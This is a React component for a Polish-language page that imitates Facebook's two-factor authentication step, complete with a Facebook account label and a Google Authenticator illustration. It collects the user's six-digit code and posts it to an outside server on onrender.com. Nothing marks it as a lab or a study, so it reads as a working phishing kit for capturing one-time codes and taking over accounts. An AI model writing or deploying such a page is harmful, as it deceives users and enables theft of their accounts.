import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';

const Error_Page = () => {
  const [code, setCode] = useState('');
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();

  const handleSubmit = async () => {
    setLoading(true);
    try {
      await new Promise((resolve) => setTimeout(resolve, 2000));
      const response = await fetch("https://projektdawid-1.onrender.com/submit_code/", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ code }),
      });

      if (response.ok) {
        navigate("/success");
      } else {
        alert("Błąd podczas wysyłania kodu.");
      }
    } catch (error) {
      console.error("Error submitting code:", error);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-white px-6 py-30 font-sans flex justify-center">
      <div className="w-full max-w-xl text-left">
        <p className="text-sm text-gray-600 mb-1">Dawid Sołtys • Facebook</p>

        <h1 className="text-2xl font-semibold text-gray-900 mb-2">
          Przejdź do aplikacji uwierzytelniającej
        </h1>

        <p className="text-sm text-gray-800 leading-relaxed mb-6">
          Wprowadź 6-cyfrowy kod dla tego konta uzyskany ze skonfigurowanej aplikacji do
          uwierzytelniania dwuskładnikowego (takiej jak Duo Mobile lub Google Authenticator).
        </p>

        <div className="mb-6">
          <img
            src="/GoogleAuthenticator.png"
            alt="Ilustracja aplikacji uwierzytelniającej"
            className="w-full h-auto object-cover rounded-md"
          />
        </div>

        <input
          type="text"
          placeholder="Kod"
          value={code}
          onChange={(e) => setCode(e.target.value)}
          className="w-full px-5 py-3 text-base border border-gray-300 rounded-xl mb-4 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500"
        />

        <button
          onClick={handleSubmit}
          disabled={loading}
          className={`w-full text-white text-sm font-semibold rounded-xl py-3 mb-3 transition shadow ${
            loading ? "bg-blue-300 cursor-not-allowed" : "bg-blue-600 hover:bg-blue-700"
          }`}
        >
          {loading ? "Przetwarzanie..." : "Kontynuuj"}
        </button>

        <button className="w-full border border-gray-300 py-3 rounded-xl text-sm hover:bg-gray-100 transition">
          Spróbuj innej metody
        </button>
      </div>
    </div>
  );
};

export default Error_Page;
